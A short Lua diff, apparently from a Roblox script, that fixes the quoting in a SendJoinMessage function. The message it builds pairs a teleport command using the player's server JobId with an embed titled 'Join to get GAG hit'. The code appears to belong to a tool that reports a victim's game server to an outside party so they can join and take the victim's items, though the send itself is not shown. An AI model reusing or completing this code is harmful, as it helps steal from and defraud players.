@@ -267,7 +267,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = prefix .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')',
+        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "' .. game.JobId .. '")',
         ["embeds"] = {{
             ["title"] = "🐴 Join to get GAG hit",
             ["color"] = 65280,
